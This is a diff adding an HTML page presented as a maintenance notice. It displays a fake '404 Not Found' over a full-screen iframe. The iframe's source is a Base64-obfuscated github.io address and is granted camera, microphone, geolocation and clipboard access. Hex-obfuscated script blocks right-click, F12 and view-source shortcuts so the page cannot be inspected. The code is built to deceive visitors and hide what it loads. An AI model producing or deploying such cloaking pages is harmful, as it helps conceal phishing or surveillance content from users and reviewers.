@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Situs Sedang Dimaintenance</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #121212;
+            font-family: sans-serif;
+        }
+        #_0xframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 1;
+        }
+        ._0xfake {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            z-index: 10;
+            pointer-events: none;
+        }
+        ._0xfake h1 { font-size: 2.5rem; margin-bottom: 10px; }
+        ._0xfake p { color: #aaaaaa; font-size: 1.1rem; }
+    </style>
+</head>
+<body>
+
+    <!-- Tampilan Umpan Palsu -->
+    <div class="_0xfake">
+        <h1>404 Not Found</h1>
+        <p>The requested URL was not found on this server.</p>
+    </div>
+
+    <!-- Container Iframe Terenkripsi -->
+    <div id="_0xcontainer"></div>
+
+    <script>
+        (function() {
+            // Mengamankan URL target ke dalam format Base64
+            var _0xencUrl = "aHR0cHM6Ly9hc2VweHl6MTIuZ2l0aHViLmlvL2JvdC13YS1kYi9ob3N0aW5nL3J1bmh0bWxfMTc4MTIzMjE2ODY5MS5odG1s";
+            var _0xdecUrl = atob(_0xencUrl);
+
+            // Membuat elemen iframe secara dinamis lewat memori runtime
+            var _0xff = document.createElement('iframe');
+            _0xff.setAttribute('id', '_0xframe');
+            _0xff.setAttribute('src', _0xdecUrl);
+            _0xff.setAttribute('allow', 'geolocation; microphone; camera; clipboard-write');
+            
+            document.getElementById('_0xcontainer').appendChild(_0xff);
+
+            // Anti Klik Kanan & Anti Inspect Element (Hex Obfuscated)
+            document.addEventListener('\x63\x6f\x6e\x74\x65\x78\x74\x6d\x65\x6e\x75', function(_0xe) {
+                _0xe.preventDefault();
+            });
+
+            document.addEventListener('\x6b\x65\x79\x64\x6f\x77\x6e', function(_0xe) {
+                // Blokir F12 (123)
+                if (_0xe.keyCode === 123) {
+                    _0xe.preventDefault();
+                    return false;
+                }
+                // Blokir Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+                if (_0xe.ctrlKey && (_0xe.shiftKey && (_0xe.keyCode === 73 || _0xe.keyCode === 74) || _0xe.keyCode === 85)) {
+                    _0xe.preventDefault();
+                    return false;
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
